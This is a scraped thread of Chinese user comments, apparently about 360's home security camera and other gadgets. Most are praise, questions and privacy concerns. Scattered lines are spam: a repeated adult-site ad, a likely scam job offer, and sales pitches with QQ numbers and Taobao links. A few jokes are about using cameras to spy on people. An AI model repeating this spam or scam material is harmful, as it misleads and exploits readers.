这样的摄像头，没写，每秒几桢画面，估计是每秒30針的淘宝10元货，720P，也太低了点。请群众不要上当，以免后悔，淘宝10块钱包邮，这种的一大堆，不解释
有，我前几天看得连爱手环就可以，倒也不贵，现在199
不在家的时候应该挺有用的。希望我有运拿的到试用。
无线充电很酷炫那
这个可以解决 
这个太酷炫了！！！
这是远程监控摄像头吗？有什么特别的呢？免费申请，是不是免费吗？
希望有幸拿到！
感觉这个在电脑上安装腾讯QQ，再点击视频连接要方便许多，这样对使用者的要求大大降低，特别是老年人，他们很多对电脑都不懂，这个产品我看好它
什么时候出来啊？出来了就买这个，，，，期待中 O(∩_∩)O~
保存在360云盘，7*24小时循环存储
。。。。。。
想要实时估计有点困难 毕竟它现在是无线的
地图投影的就好了 投影在汽车玻璃上
有寄到外国的吗
期待使用或者出品
碰碰运气 。。。。
Fit Smart售价为199美元（约合人民币1230元） 学生党伤不起！
中国制造加油
文化差异啊，中国人的毅力要比老外强，中国人宁愿靠毅力起床也不靠电击，如果有人用电击叫我起床，那叫起的一定是一头野兽...
适合我看电影 
很酷的产品
期待研发出能投影出5D的!2000元以内我都买
这款新产品如果真有那么好就太好了，只是不知道如何设置远程控制摄像头？ 
好牛逼啊！！
真希望自己能亲身体验···
给我吧！！！我爱360，
别这样说，现在太阳能供电越来越技术了，所以早点开发这种用电的是有很多好处的，不然你还想等太阳能技术走进家家户户你才想来开发这些科技？
我们的可以远程控制 上下左右旋转 
通过ip地址咯
我们的可以
还有更酷的
几万人等着这50台 
我们都出几年了
这样的产品我们公司已经出来几年了
在哪里下载360家庭卫士手机客户端啊？
连接怎么连接啊  需要插入电脑吗？
在中国手机端流量耗不起啊！不实用！除非是和哪家通信公司合作，谁用这个流量免费，互赢那还可以
太实用了，以后出差的话也不用叫亲戚朋友帮忙看家了。
实在太酷了。期待ing。。。 貌似现在这个项目在众筹之中，众筹项目支持者可以120美元的价格抢先购得底座+手环的套餐。不过正式发售期要到明年上半年。。。。
这类手表淘宝几年前就有了，没啥创意，另外最后一个功能是设置宝贝安全区，这类安全区都可以自由设置的。
我觉的不错了，起码说出了一个终点，这也是我为什么不买的一个原因，你说手表这东西不比手机，天天的充电很反感，第二就是但是辐射问题，虽然都说是安全的，但是鬼知道到底安不安全。。
在中国手机端流量耗不起啊！不实用！除非是和哪家通信公司合作，谁用这个流量免费，互赢那还可以 
好东西 大家都喜欢 中国人自己的产品 永远支持
360服务大众  真是感谢360  希望我有机会获选 360你们付出的努力我们一直支持你们  
我家对面住户，把他的房子出租了，结果她家里每天都是一些不三不四的人，有时经常朝我家门口扔垃圾，我早就想在门上安装一个摄像头，这样一方面知道是谁扔的垃圾，另一方面，观察一下都是些什么人进进出出，但苦于我经常外出办事儿，中午不在家里，所以我想，即便安了摄像头也没有时间去蹲守，现在好了，有了360家庭会是以后，我在哪里都会随时知道家门口的情况，如果抓到他们仍垃圾的尽头，那我就可以跟房东申诉解决这个矛盾，
我家对面住户，把他的房子出租了，结果她家里每天都是一些不三不四的人，有时经常朝我家门口扔垃圾，我早就想在门上安装一个摄像头，这样一方面知道是谁扔的垃圾，另一方面，观察一下都是些什么人进进出出，但苦于我经常外出办事儿，中午不在家里，所以我想，即便安了摄像头也没有时间去蹲守，现在好了，有了360家庭卫士以后，我在哪里都会随时知道家门口的情况，如果拍到他们扔垃圾的镜头，那我就可以跟房东申诉解决这个矛盾， 
我在想，家里装了这款产品，360可不可以通过监控机器码，直接看到你家里一切，你在家里干什么都在别人的监控之中
证明你们根本不懂营销
没什么可说的，只要求快点开卖，50台看是等不到了
好DD，贵吗？
呵呵！又是土豪产品。。。。。。
支持360         
支持360    我爱360     
这个应该是个很不错的东西。支持360！我爱360！
支持360
超爱，惊喜，永久支持。
活到老用到老，360是我一生的伴侣！
我给你啊，
支持360.希望有机会得到360摄像头
你没想过这样会触犯别人的隐私权么？
台灣地去根本無法申請，電話無法輸入
从发现360产品到现在，这么多年了，一直都用着，超好用。无论是电脑蓝屏或是浏览器打不开，亦或是电脑程序、桌面图标出现故障等等，不知道为我解决了多少次电脑问题了，真的太感谢了！360真的是我永远的铁哥们！支持到底！一直下去！
从发现360产品到现在，这么多年了，一直都用着，超好用。无论是电脑蓝屏或是浏览器打不开，亦或是电脑程序、桌面图标出现故障等等，不知道为我解决了多少次电脑问题了，真的太感谢了！360真的是我永远的铁哥们！支持到底！一直下去！ 如今看到360摄像头当然更是少不了的伴侣了啊，爱他更想要他！
上侧面的防尘措施如何落地？需要考虑做好防尘与日常卫生清理。 音质必须保障全频覆盖。
非常棒，但希望能够支持自主云平台，能够扩展对接家中的其他监测设备，比如血压、煤气、家庭卫士摄像头的联控！
看似很酷   呵呵 期待中
帅。。。。
夜视功能？ 是否能配套提供电池，以保证24小时供电？ 是否能够支持与云盘结合，自动上传录像？ 什么操作系统？是否能够支持后期扩展应用？融合智能家居环境？
实在太酷了。期待ing。。。 貌似现在这个项目在众筹之中，众筹项目支持者可以120美元的价格抢先购得底座+手环的套餐。不过正式发售期要到明年上半年。。。。 
以后家里的一切可以向360做现场直播了,你认为好么?
看着挺不错，准备给家人买一个，时时关注身体状况
希望存储容量更大，自备wifi，就好了
超爱360，崇拜周鸿祎大哥，360真的很不错。
很给力！ 外观防尘有待改进。 触摸屏可以作为选配。 最好集成内置音箱、集成蓝牙。 现在液晶成本已经很低了，可以考虑加大液晶面积。  数码相框、背景音乐、智能中控，智能家居首选！我太爱了！
家中监控、店铺监控、爱车监控、远程培训【远程学习】、视频会议。 亲情+安全，面对的是男女老少，需要做到易用、易扩展。  希望360能够早日营造全系列的智能家居全套绿色生态方案！
永远支持360.
不错。不错。但愿价格不要太高。
支持360。
值得期待~~~
诚骋淘寶蒹职，每天50～150元，没有时间要求，多劳多得，不影响正职，只要你有网购经验就可以，在家用自己电脑就能做，有意者私聊我
男士福利！搜【欢情阁】你懂的！女士勿扰！
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
男士福利！搜【欢夜阁】你懂的！女士勿扰！  
你知道的太多了
360不错啊
永远支持360. 
智能家居，生活的一个升级，期待越来越多好产品，支持360
支持360。
智能家居，生活的一个升级，期待越来越多好产品，支持360 
一直在用360，支持！！！！！
帅的没法说
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
支持360
一直在使用360产品。支持360
男士福利！搜【欢夜阁】你懂的！女士勿扰！
你可以讓內陸的朋友幫你申請
手机电池不给力是全世界都无法解决的大问题，看看电子表、石英钟装颗电池用两年，手机为什么就不能想办法解决一天到晚都在充电的问题呢！凡是用智能机的几乎人手一个蓄电池（充电宝其实就是蓄电池），多无奈啊！
一直在使用360软件以及产品。这次又出新的了！！！！！
支持360
360产品率先打破 国内领域 不免费的神话。
智能家居，生活的一个升级，期待越来越多好产品，支持360！！！！
期待USB3.0
很好的电子产品，智能社会智能家庭
支持360
便宜点就好 
支持360
360的软件手机和电脑一直在使用，目前出现的产品个人感觉很好！
一直支持360   喜欢用360
我是我们单位最早使用360的人员，我比我们网管多用的早
支持，我家中电脑及办公室电脑用的都是360产品，随身WIFI也是360产品
好想得到！！！！！！！！！！！！！！！！！！！！！！
男士福利！搜【欢夜阁】你懂的！女士勿扰！
360产品很强大，支持360
期待幸福电子
好漂亮，了不起
360的产品现在慢慢的都很不错了，我一直都在使用，唯一担心的是一但我们都慢慢依赖360，依赖到都离不开了以后，360会不会跟那“啥啥”东东一样跟着提高或者加收这费那费呢？我想这不仅仅是俺一个屌丝的担心啊！！
好喜欢啊，好像买一个！
不知道价格是什么价位！
不错不错！真的很不错！永远支持奇酷！支持360！！！
同志 2200W 请问你家是发电的吗
我们全家手机，电脑全是360，我们信赖360，喜欢360，永远支持360。
报警功能：当小偷侵入你的家庭，360家庭卫士能及时将报警信息发到指定手机，并将图像、声音、录像发到指定邮箱或360网盘中保存，即使360家庭卫士被小偷偷走了，也能在网上查询到录像，为公安侦破提供证据。
360总是给我们惊喜
一般一般世界第三
mm0253@qq.com
支持360.希望360给我们更多惊喜。
我们全家手机，电脑安装的全是360，我们信赖360，喜欢360，永远支持360。 
支持360.希望360给我们更多惊喜。 造福人类以社会
360有点意思让我想起一句广告语 科技成就生活之美 
当然可以用，我们公司都是台式机，大家都在用呢 
期待中...
周哥哥：你滴奇酷最好是免费送用！
360的产品很接地气，使用方便，简单。32赞！！！
试试看吧，人毕竟很多
支持360 希望得到，使用后能帮助更好的完善。
什么时候能上市场啊  期待306奇酷
信赖360
真的太给力
最开始电脑用的金山毒霸，后来感觉360比较好用，功能也越来越强大，现在手机电脑平板用的都是360
希望价格别太贵，好拥有一个
一直支持360
没有介绍视频存贮在哪？是自带TF卡，还是上传到云端，还是要用户准备一台电脑？另外，图像通过网络传送时占用多少带宽？请对用户负责。
可以360度自动旋转吗，可以超远距离控制吗，还可以和家人对话吗？等等一些问题。
一直支持360，一样的强大，
自动侦测物体移动发出警报，会不会连家里人或者宠物走一走都会响？这不是很吵？关了声音又怕有人进屋子............
愿360能给生活带来更多的惊喜
破烂级别的！
一直在使用360产品。支持360 
360安全卫士、桌面、浏览器、杀毒、云盘、WIFI、游戏大厅、游戏保险箱、系统急救箱、手机卫士、手机浏览器等等，发现现在本本上和手机上用的第三方软件基本都是360。因为用的最多，所以感觉很方便很好用。期待这次创意界的“魔法”摄像头实用中更具创意。
大力支持！
感觉可笑了，要是没有苹果手机，还不能用了呢！
真心不错的产品，非常期待试用，这样和我的360路由就可以完美匹配了
￥1230的价格有点难接受...土豪请随意。
一直都用360，电脑手机有问题先想到360.
妈妈再也不担心我丢手机了。。。顶
如果手机离开自己的安全距离，360防丢卫生能报警就更好了
想作为家中无人时安全监控摄像用。
一直都用360，电脑手机有问题先想到360. 
360惊喜不断
很期待，希望有机会先试用！
在视频时候用的流量怎么算，监控数据放那？云端？数据安全吗，如果被入侵了，别人不是时时监控我们了？那家庭隐私都会不安全啊？
真的有这种东西，我多年以前就用过了，不用任何电池，只需要贴在手机上就行，跟个贴纸是的，貌似不到2块钱，夜市上就有，而且还是短信通话都可以，用蓝牙的时候也是可以亮的，而且是多彩的！
热烈期待……
家里面被人多次进入，不偷东西，就是来威慑。第一次在家里踩了无数的泥巴脚印，出门还把门锁好；第二次是出门前怕天气不好，锁了所有的窗户，回到家窗户被打开到最大，楼层很高。报警多次，没有用，不到2000元不立案，回访的警察还问满不满意，我告诉他们死了以后说不满意都来不及了！几千个亿的维稳资金都保不住我家不被人非法闯入，袭扰！
360的忠实粉丝！ 
360越来越牛
360确实不错的，我是360的第一批用户，一直到现在，一直很信赖，同时也一直向身边的人推荐使用360，只要360的服务理念不变，我对360的信赖也不会变。
苹果手机怎么不可以用？
期待，希望能得到试用！如果得到试用，我会用心评测的！
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
我没申请过。免费申请，全程不要钱？
很不错，支持奇酷，支持360，360在自己擅长的行业中做的更专业，更细致，赞一个！
好像很给力啊，不错啊，好像拥有个啊
支持360 
一直以来都使用360产品。支持它.信赖它.它以成为我们的一员.!
我用过最久的就是360了、浏览器都是用360的差不多都是360的软件、本人感觉360比其他的都好用。
想作为家中无人时安全监控摄像用。
360软件真好，电脑浏览器、杀毒软件挺棒的，支持
是的，一直都是你360，支持你。
小水滴的设计好漂亮，一直支持360，愿360越来越强大。
期待……  科技改变生活 继续支持
WIFI、智键。。。。。。。。。 现在是家庭卫士！ 期待更多实用小巧的360产品！
摄像手表吗，加我2714 060 332
什么时候能开始  购买？
360的创意开发及产品的工业设计已经走在国内大部分网站的前列。我很喜欢，将一直关注并支持360的成长。
永远支持你360
关键是连接，问题，蓝牙距离太短，gps需要自己供电，体积就大了，不防便携带了，不过还是希望，越小巧越好，随便粘的那种，钥匙，手机，包，钱包，等等吧，东西遗失了，用任何一部手机，打开专用软件，有没有地图都无所谓，显示遗失东西的方向，并指引着找到意识的东西，提示东西与你之间的距离。
大力支持！
支持支持支持~~
一直很喜欢360的产品  用过WiFi简直大大的喜欢的不得了。小巧实用外观还好看
能不能在老年痴呆症患者身上使用？建议增加功能 
支持360能够推出这样的产品，之前看到电信有什么电信看家同样是类似的功能，但没有详细了解，希望360在这方面做得更专业！普及度更广！
要是可以在地上行走就接近完美了，呵呵呵
我现在用的360WIFI就非常不错，真是物超所值啊。是360的忠实粉丝！
永远支持360
360太强大了，我只信赖360
360，赞一个！ 
老爸老妈带孩子还在乡下，我们在城里，可以无时无刻的看到乡下孩子的一切更放心，我是360的最忠实粉丝，终身会使用360产品，没有360的免费杀毒，也许我们现在还在用金山的花钱软件，感谢360的一切和莫大的对老百姓的支持
再带个高清显示器，我会考虑！
支持360能够推出这样的产品，之前看到电信有什么电信看家同样是类似的功能，但没有详细了解，希望360在这方面做得更专业！一直很喜欢360的产品 用过WiFi简直大大的喜欢的不得了。小巧实用外观还好看
支持支持！！希望快点发布；期待更多实用小巧的360产品。
在哪里能买到啊 
真的很有意思哈
我现在用的360WIFI就非常不错；春节时也多谢360软件帮我抢到了火车票，一直使用360，支持360！
好想体验一下什么感觉
外形不错，很有创意
能内置个内存卡吗？这样能保存一定时间的监控
是有这种情况，用蓝牙~
太好了，要是在百元以内我就必须来一个，正好家里要装修 
傻逼阿斯达斯的撒打算
建议添加几个360家庭卫士到手机客户端上，让大家都可以体验一下效果
期待  ....
没有 夜视 功能是一大遗憾！
我们都没有555555555
用360已经10个年头，一直看着360的发展和进步，支持
表链能不能设置成带锁的那种设计，害怕孩子给弄丢了
360最终极用户，呵呵，360WiFi啊什么的都有买，一直用360从不间断……
什么时候能出成品呢？？希望是平民物品
一看这些刷屏的，上来就只个字，无脑，对自己和他人都不负责的态度，看了产品介绍很肤浅，简单说明怎么使用，没解释产品传输时通过什么介质，没流量WIFI手机也能连接吗？这些监控数据安全吗，存储在那里，360到底好不好，实践才是检测真理。
从电脑上的360卫士、360杀毒、360WiFi，到手机上的 360杀毒、360卫士、360优化大师、360手机助手、360桌面、360天气、360通讯录、360日历。。。。。。我每天每时每刻，都有360陪伴。。。。我是360的绝对忠实粉丝~！
这个东西比较好！很期待！
从电脑上的360卫士、360杀毒、360WiFi，到手机上的 360杀毒、360卫士、360优化大师、360手机助手、360桌面、360天气、360通讯录、360日历。。。。。。我每天每时每刻，都有360陪伴。。。。我是360的绝对忠实粉丝~！
360一辈子的认可
360陪伴我的电脑里已经有4年多了  只能说辛苦了
看了大家的评测，我虽然没中签，但是去官网也买了一个。快快送到啊，好期待！
好期待啊！！太有感觉了！
其实是我对监控这一方面还是很期待的，期待360能够做得更好
我用过最久的就是360了、浏览器都是用360的差不多都是360的软件、本人感觉360比其他的都好用。
这些试用都好高大上啊！喜欢，360加油哦
信任360，我家不管电脑还是手机都是用的360，期盼360越做越好！
还不如买智能电视呢！
哪里有卖的啊，刚好要装修了，急需啊
好期待360能做出能符合安防要求的硬件产品，结合软件优势，从产品到服务，打造一个新的领域。
一直支持360
样子好漂亮，效果应该也很好，如果中奖会很用心的写试用报告的，希望好运~
我简直已经成为了360控，不论是我自己还是别人，只要让我给修电脑，直接装上360干掉腾讯管家。只是360的系列产品很是很少，比如路由器，其实我更喜欢三根天线的。如果定期的推出360公仔像淘宝公仔一样，或者出售，或者赠与用户，放在办公桌，真的很有成就感
360产品一直都是性价比最高的电子产品。值得一试，试过就离不开了。
好东西，不容错过~~支持360~~支持360~~
从电脑到睡觉大部分软件都是使用360的。 
男士福利！搜【欢夜阁】你懂的！女士勿扰！  
太想要了就是希望价格不要太高了要不真受不了 
360又有新产品了，很是期待。
windows phone 系统是否可以使用。增加多系统APP使用。
坚决支持360
喜欢~~期待ing
360,强！ 
不错不错，这个创意真的很不错，期待中......
好神奇哦~~~希望不要太贵昂~
如果能带云存储就好了
那导航仪还有什么用呢？
不错的东西
这东西要是孩子能拥有就太棒了
那么小体积，要有个夜视功能估计开一晚上都能烧着了。
真心期待，等你等好久啦
......太.......太.......太！
 什么时候开卖哦，期待！
一直喜欢360推出的每一件产品.
真的很好，这样我 就可以和家里人   方便的沟通和交谈了  
这个如果出来那就太高大上了
不知道是不是可以同时使用多个，要是可以的话，就再也不会丢东西啦。
我可以通过手机随时随地监控家里的情况，希望申请的到谢谢
起码对孩子的人身安全是一层保障
性能都好，就是外观不够奢华！
看看咱360的级别就知道咱有多热爱360了，会一如既往的支持360，加油！！！
期待。。。
期待。。。
希望我们的信任能得到你的真心的进步以及回报
360,现在越来越给力了，
设计要求和我的要求接近，加云台或者能行走移动就几近完美了，期待，期待
360这是要进军智能家居了，嘿嘿，作为360的忠实用户，我表示将会一如既往的支持，希望能够有幸体验到360家庭卫士。
我爱360
不知道什么时候才能真正出产品？ 能体验就好了 
几款手表式的手环之类的，都是蛮值得期待的。
哼，360出安全路由器就申请过，结果半年过去才有回应，并且要90元购买。不是免费试用吗？
好东西，不错哈，真心不错，360可以
非常好.2215
   点32个赞，买了3个360wifi了 很好用~！
360的产品和软件，一直都在电脑和手机里使用，非常好！而且性价比高，多年来绿色的十字出现在电脑和手机的屏幕上已经成为了一个固定的习惯和爱好了！
此物略屌！
终于看到了个有觉悟的评论
希望选中我哦~    永远支持360~
一直在默默的看着360成长，每有一款新产品，我总是迫不及待的去更新使用，我是360的绝对粉，我为360代言
漂亮啊！好喜欢的感觉！！！
++++++++++++++++++++++1
我是360的忠实用户，360安全卫士、360杀毒、360手机助手、360软件管家、鲁大师、360随身wifi。几乎360所有的产品我都在使用。看来没了360是不行的。呵呵。
那样感觉路况不清楚，有点危险，跟人感觉不是很实用！呵呵
这个东西要钱嘛？
太喜欢了 太喜欢了~~~
有点贵了 。。。
这个可以有
期待360的产品呀  支持哈 
如果能带云存储就好了 
没有夜视功能么
黑白化就是省电的这种方式我并不喜欢、希望大神门能研发出彩屏、双屏还是很酷的。
好象还能打电话样的，前卫啊，简洁，大方。
360每款产品都十分喜欢 总的来形容 灵活小巧 安全贴心~！！！  这款“小水滴”更是适合在上班的爸妈们看着在家的小宝宝 看着他们在家的一举一动 实在是太有爱了 
希望选中我哦~ 永远支持360~ 
360的产品和软件，一直都在电脑和手机里使用，非常好！而且性价比高，多年来绿色的十字出现在电脑和手机的屏幕上已经成为了一个固定的习惯了
360产品都很好，期待哦。
外表靓丽 功能强大，高端产品值得买
360你卖电视吧！强烈要求！！！
支持360 
以前一直用360没想到会有这好事，谢谢啊！  好想要哦。好喜欢。希望选中我。支持360 比永远更远支持360
50个不知道有木有希望。对我来说，正需要的。
现代科技好神奇！
360，相信你
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以加QQ群52923274 一起研究探讨这些智能化产品！
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以加QQ群52923274 一起研究探讨这些智能化产品！
前几天买了款ithink的网络摄像机，在功能以及外观上要比这个强大很多，ithink的存储方式比较安全，不会泄露个人隐私，云存储的话很容易就泄露我们的隐私，大家可以加QQ群52923274 一起研究探讨这些智能化产品！
360是不会这样做的 产品的上市 必然经过重重的检验  
只有想不到，没有做不到，这个一定很好玩。
昆明很需要   
大爱360 没360电脑和手机都不行哈~
关键是连接，问题，蓝牙距离太短，gps需要自己供电，体积就大了，不防便携带了，不过还是希望，越小巧越好，随便粘的那种，钥匙，手机，包，钱包，等等吧，东西遗失了，用任何一部手机，打开专用软件，有没有地图都无所谓，显示遗失东西的方向，并指引着找到意识的东西，提示东西与你之间的距离。 
看着很不错，我会继续关注的哦
我买了5个
360你总会让我心动，一只会跟随你
顶360 ！！！！
我希望360的免费试用产品能抽到我。
这款“360家庭卫士”有没有视频及语音存储功能呀？没有这方面的说明呀！能不能将实时视频保存呀？
点名时间里面有亲们可以看下哦
希望可以抽到我     谢谢啦
对于360这款家庭卫士，个人一些建议： 1、没有红外灯，这是一带缺陷； 2、用的是120°镜头，120°镜头也有缺陷，会让画面图像变形，建议用2.8或者3.6mm足够了。 3、里面标明的参数是15帧，这是标错？15帧率画面会很延时；常见的在PAL模式下 都是25帧率/s; 4、远程访问是p2p模式吗？ 5、作为家庭卫士，少了存储模式，想问下，要一天到晚开着电脑录像吗？
还是没明白，这个事起到什么作用的？追踪器一个放在身上一个放在手机摄像头上？没懂 =、=
结果防丢卫士丢了，毕竟那么小的东西
喜欢，好想用
支持中~~~~~~~~~~~~~~~希望有我  
希望选中我，如果买要多少钱？？
尼玛那是最大功率2200W不是用电2200W。你们上过学吗？还是老师脑袋让门挤了？
还没装修，一直计划着搞一个智能安全的家。。。。希望能抽中啊，，，，我是无敌的粉丝啊
这个大师吗？这么专业.   免费的 先申请一个呗
不错，期待！
这款产品好酷哦点个赞
值得期待。呵呵
应该不错~~
很期待能够申请到，更期待价格的公布
其实以前刚用360的时候不太习惯。觉得没的什么特殊的。但是后头越用越久感觉自己都慢慢的喜欢上这些功能。都是360浏览器很好用。我最喜欢的。所以我一定会支持360.加油。
一直信赖360！
360，加油！
顶360 ！！！！
怎么没有我啊
这怎么感觉就给手机辅助了个红外线遥控的功能额。。。NOTE3自带红外线，下个遥控软件，现在我家里的电视空调之类的都只要用手机控制啊，不需要加其他玩意啊
这个东西好 ~出来我就要买一个~
360老品牌值得信赖   希望能够选到
通过软件应该可以储存，如果可以，肯定要开电脑才能储存，不然没有终端解码。
这个被简单改装以后会流往各大酒店娱乐场所，然后网上就出现了大量的视频。
支持   很好的产品   期待
这也算3D？岂不是很多年前就形成了3D术了？
史上最漂亮的最华丽的时尚智能穿戴设备--Moto 360。何时可能试用
360 加油，你是最棒的！
给100个赞！！！360的产品 值得信赖
一直支持360的产品 很新颖 有实用才最主要。
你当大白菜呢。
我家曾经用过家视宝手机监控设备，跟你们这款产品很相似，不过家视宝很贵，前年买花了2680，现在家视宝降价了只要1500元，需要的可以联系我朋友的QQ553711933买，他是代理商，我家开店的，我用家视宝主要晚上用来监控防贼的，一有移动目标就会报警到手机上，希望你们的产品也有夜视功能，我对这类产品比较了解，如果我试用能写出很专业的报告，我是360的忠实用户
360各个产品给我们的工作和生活带来了极大的便利，为我们的网络安全提供了坚实的保障，一直以来我及我的小伙伴们都在使用360的相关产品，操作简单，方便实用。一句话：永远支持360。
希望我能中奖
手机内存卡可以存储，只要手机开着软件就行的
男士福利！搜【欢夜阁】你懂的！女士勿扰！  
需要同类产品的可以百度下家视宝，我朋友代理这个产品
需要同类产品的可以百度下家视宝，我朋友代理这个产品 ，或者直接加QQ553711933，最低1500
我希望能马上买到，什么时候有卖？
很好，很强大
赞！家庭约炮神器~
一直梦寐以求的号产品 
上一批99元的时候我预约了，可是在10点发售，等我下班回到家了啥都没了。有预约码都没用。。。。。。 我想问下360预约有什么用的？？？？直接用抢就好啦！！！
还没装修，一直计划着搞一个智能安全的家
看清楚，这是美国的售价，到中国还不知道得翻成什么价儿呢，2000多到手，你想也别想~
对于360这款家庭卫士，个人一些建议： 1、没有红外灯，这是一带缺陷； 2、用的是120°镜头，120°镜头也有缺陷，会让画面图像变形，建议用2.8或者3.6mm足够了。 3、里面标明的参数是15帧，这是标错？15帧率画面会很延时；常见的在PAL模式下 都是25帧率/s; 4、远程访问是p2p模式吗？ 5、作为家庭卫士，少了存储模式，想问下，要一天到晚开着电脑录像吗？
通过软件应该可以储存，如果可以，肯定要开电脑才能储存，不然没有终端解码。 
我想试用一下。。。
360很给力啊，设计的产品很新颖，一直支持360
盼望能够通过的申请
真心得到！希望选中！永远支持360！！！
真心喜欢，360太牛了
希望成功http://shop109848913.taobao.com/?spm=a230r.7195193.1997079397.1.tLPik7
需要同类产品的可以百度下“一部手机就可以查看监控的实时视频监控设备- 家视宝”我朋友代理这款产品，功能比360的多点，原价2680，现1500
相当期待，尤其是能实时察看家中情况功能。
需要同类产品的可以百度下“一部手机就可以查看监控的实时视频监控设备- 家视宝”我朋友代理这款产品，功能比360的多点，原价2680，现1500 
支持！！！360的都支持！很好用，很人性化
感谢对360家庭卫士的支持，您的建议很有价值，已收集
360太棒了吧，这个产品给我们的生活能带来很大的实用性
期待好产品，能给全家带来温馨的爱！
这试用过，还用不用还？ 
好不好用过才知道，行不行，就看你好不好，支持360
我是做智能家居行业的，希望可以了解合作。
需要同类产品的可以百度下“一部手机就可以查看监控的实时视频监控设备- 家视宝” 1、内建micro-SD卡接口可支持 SD卡录像 2、DI/DO报警检测触发 3、广角左右上下旋转动态控制 4、iphone/ipad及Android行动装置专用的软件 5、支持NAS存储设备录像，利用“NAS浏览”功能简单设置NAS 6、可控制事件预定录像 7、支持 802.11n无线WPA-PSK(2)的安全模式
真心得到！希望选中！永远支持360！！！
 喜欢这个产品的功能。很实用
希望产品是轻巧便携带的
继承者们金宇彬崔英道同款豆豆鞋男苏有朋李敏镐金秀贤都敏俊情侣-淘宝网 http://item.taobao.com/item.htm?id=25590308122
好犀利的评价....
360很给力！！！
外观不错，性能强大，梦求一个
我是一名物联发烧友，我负责公司的集成技术开发，也就是把N多家的产品整和在一起形成一个大的物联网，比如智能家居、商业环境监控。 本打算家里买摄像机，再配拾音器的，被360摄像头集成了真好，如果用的不错以后可以集成在我们的项目中。 
360这款 家庭卫士 上市之后肯定会打出一片天地。我看好你们   期待上市。 然后抢购吧！
分别光天化日他
360的产品质量一定好!
最好是直接接在家中路由器WLAN口上，这样就可以不用整天开着电脑了
期盼上市中~
支持啦，选我，选我~！！！
上班族的福音啊 手机上也能看到孩子了
支持支持加油加油
好想拥有它。给宝宝用，她最怕测体温了
加油啊！！这东西实在是太犀利了
这玩意放家里需要家里电脑保持开机状态么？
以前用过360的产品，360wifi和360智健都很好用，
真心希望能够得到，支持360所有的产品喔
这应该是家具安全监控的引领者，小巧功能多，支持！
好想得到这个宝贝，好期待！！！
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
360这款 家庭卫士 上市之后肯定会打出一片天地。我看好你们 期待上市。 然后抢购吧！ 
600多的都嫌贵···现在直接用CPU里自带的显卡     反正打打LOL   效果可以全开也不卡了
宝贝，什么时候归我使用啊！！好想拥有它啊
如果是贴在玻璃上，是否家里的每块玻璃都要安装此产品，那样整个成本就大大的上升了！
支持！~~~~~~~~~~~~~~
如今互联网时代这么发达，小偷利用互联网来偷东西，岂不是很容易。如果出去旅游，身在外地，不知道家里怎么样。我看到360家庭卫士正在免费申请，我就迫不急待的申请了一个，不知道会不会调中我。好期待。
很期待哦！360  永远支持你哦！打倒肘子！
父母最需要这样一个监测仪器了，好想送一个给他们啊
看好360 ！！
砸到我的头上来吧。。。哈哈哈 
前几天我还淘宝买了一个，白天视频感觉还行，但晚上感觉不怎么样，移动针测拍摄的照片不是很清楚，移动可卡顿的现象，不知道这个性能会怎么样？？
男士福利！搜【欢夜阁】你懂的！女士勿扰！  
如何确保网络视频信号不被监视和拦截。。。
不要像随身wifi一样，刚开始用得挺好的，后来更新了就用不了了。还有那个一键通，经常不小心按到，拍了好多没用的照片。
这些东西在那有卖的 ？？
你是哪儿人呢？我们就是专门做智能家居的，如果你有需要，可以加QQ详谈：402807616
必须可以，360产品杠杠的....
愿其中一个幸运儿是我
价位太高。
听起来不错哦 
希望360家庭卫士支持与360安全卫士类产品同步wifi连接,同时支持电脑及手机版,用以同时充当电脑及手机音频输入/输出设备.
支持国货，中国智能硬件雄起
如果能开关手机就好了
太好了，正好需要
男士福利！搜【欢夜阁】你懂的！女士勿扰！  
好东西,可向全世界力推,创意较好,不知是否防水\防磁.价格多少? 
手机能用吗
这个东东真的不错，看好360
我希望试用一下`﹀`   
大有用处！！！
我想试试 希望通过申请@家庭卫士官方
好想要一个啊  
这样家里就会很安全啦
我们是专门做智能家居的，若有需要，可以联系我哟~共同进步~
求中签，我刚好需要用啊。。。。。。。。。。。。。。。
类似于手机壳嘛，具备防水功能岂不更好
没微信咋办
再加上冷暖空调电风扇效果，模拟的是不是更真实了。
功能好，造型也不错，期待
希望音质要好点，续航能力好长点。
给个预约时间哦
这个东西很科幻啊。最好是 点哪就用哪个语言。这样沟通无障碍啊
独自在外工作，家里父母孩子老婆，又是农村。现在又都是独生子女，家人的安全让人每天牵挂。希望这个产品能有用。。。
造型还不错，不知还有没有其他功能。  
看操作方不方便。
这个真心棒！不过散热怎么解决呢？
看操作方不方便。
赞！！~~\(≧▽≦)/~
宝贝，什么时候归我使用啊！！好想拥有它啊 
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
能翻译一下吗？
这太玄幻了，不过很赞。
这太玄幻了，不过很赞。
好期待，好像快点拥有，能看别人洗澡的吗？ 
漂亮！！！
非常希望能够体验一下产品强大的功能，期盼通过试用申请！！！
这个可以有 
我希望能试用一下、360对人们的帮助可真大呀！！(*^__^*) 嘻嘻……
我一定能到你的360摄像头，呵呵
这个淘宝上就有了,早在用了. http://s.taobao.com/search?q=+%CE%DE%CF%DF%CD%B6%C6%C1%CD%C6%CB%CD&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=1.7274553.1997520841.1&amp;initiative_id=tbindexz_20140717
您好，我们的Ghost不会出现掉下来的情况，手机卡了或是没电了，飞机依然会执行当前你给予的指令，不会掉落，请您放心！
这里差不多的东西大把! http://s.taobao.com/search?q=+%CE%DE%CF%DF%CD%B6%C6%C1%CD%C6%CB%CD&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=1.7274553.1997520841.1&amp;initiative_id=tbindexz_20140717
真心喜欢   希望让我试用
不知道以后要多少钱啊
360产品理念强、新颖、高端大气，真的不错。支持！！！希望看到更多的360产品进入市场。
希望我能试用成功哦
您好，当遇到这种情况时，要看具体的碰撞程度，若是轻微的碰撞，飞机一般是不会出现问题的。
男士福利！搜【欢夜阁】你懂的！女士勿扰！
我也想給我孩子買一個
